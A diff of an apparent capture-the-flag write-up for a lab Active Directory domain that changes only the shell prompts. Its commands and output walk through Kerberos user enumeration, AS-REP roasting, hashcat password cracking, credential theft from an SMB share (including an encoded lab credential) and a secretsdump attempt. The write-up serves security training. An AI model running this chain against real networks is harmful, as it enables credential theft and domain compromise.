@@ -1,7 +1,7 @@
 # nmap
 ## -a
 ```console
-kali@kali:~$ nmap -A 10.10.223.29 
+bibo318@parrot:~$ nmap -A 10.10.223.29 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 08:39 EDT
 Nmap scan report for 10.10.223.29
 Host is up (0.046s latency).
@@ -59,7 +59,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 ## port
 ```console
-kali@kali:~$ nmap -p- 10.10.223.29                                                      
+bibo318@parrot:~$ nmap -p- 10.10.223.29                                                      
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-14 08:50 EDT                              
 Nmap scan report for 10.10.223.29                                                            
 Host is up (0.058s latency).                                                                 
@@ -98,7 +98,7 @@ PORT      STATE SERVICE
 
 
 ```console
-kali@kali:~/Downloads$ ./kerbrute_linux_amd64 userenum userlist.txt -d spookysec.local --dc 10.10.223.29
+bibo318@parrot:~/Downloads$ ./kerbrute_linux_amd64 userenum userlist.txt -d spookysec.local --dc 10.10.223.29
 
     __             __               __     
    / /_____  _____/ /_  _______  __/ /____ 
@@ -132,7 +132,7 @@ Version: v1.0.3 (9dad6e1) - 06/14/20 - Ronnie Flathers @ropnop
 
 # Exploiting kerberos
 ```console
-kali@kali:~/impacket/examples$ python3 GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.10.223.29
+bibo318@parrot:~/impacket/examples$ python3 GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.10.223.29
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
 Password:
@@ -143,13 +143,13 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:hashhashhash
 google hashcat example, find hash start with *krb5asrep*. now put hash in a file and use hashcat to crack it.
 
 ```console
-kali@kali:~/THM/AD$ hashcat -m 18200 -a 0 -o crack.txt user.txt /home/kali/Downloads/passwordlist.txt --force #use given wordlist
-kali@kali:~/THM/AD$ cat crack.txt # view carcked password
+bibo318@parrot:~/THM/AD$ hashcat -m 18200 -a 0 -o crack.txt user.txt /home/kali/Downloads/passwordlist.txt --force #use given wordlist
+bibo318@parrot:~/THM/AD$ cat crack.txt # view carcked password
 ```
 
 # Enumerate smb
 ```console
-kali@kali:~/THM/AD$ smbclient -L \\\\10.10.223.29\\ -U svc-admin
+bibo318@parrot:~/THM/AD$ smbclient -L \\\\10.10.223.29\\ -U svc-admin
 Enter WORKGROUP\svc-admin's password: 
 
         Sharename       Type      Comment
@@ -161,7 +161,7 @@ Enter WORKGROUP\svc-admin's password:
         NETLOGON        Disk      Logon server share 
         SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
-kali@kali:~/THM/AD$ smbclient \\\\10.10.223.29\\backup -U svc-admin
+bibo318@parrot:~/THM/AD$ smbclient \\\\10.10.223.29\\backup -U svc-admin
 Enter WORKGROUP\svc-admin's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -173,17 +173,17 @@ smb: \> ls
 smb: \> get backup_credentials.txt 
 getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
 smb: \> exit
-kali@kali:~/impacket/examples$ cat backup_credentials.txt 
+bibo318@parrot:~/impacket/examples$ cat backup_credentials.txt 
 YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
 ```
 its is a base64 so run
 ```console
-kali@kali:~/THM/AD$ base64 -d backup_credentials.txt 
+bibo318@parrot:~/THM/AD$ base64 -d backup_credentials.txt 
 ```
 
 # Elevating Privileges 
 ```console
-kali@kali:~/impacket/examples$ python3 secretsdump.py domain/user:password@ip
+bibo318@parrot:~/impacket/examples$ python3 secretsdump.py domain/user:password@ip
 Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
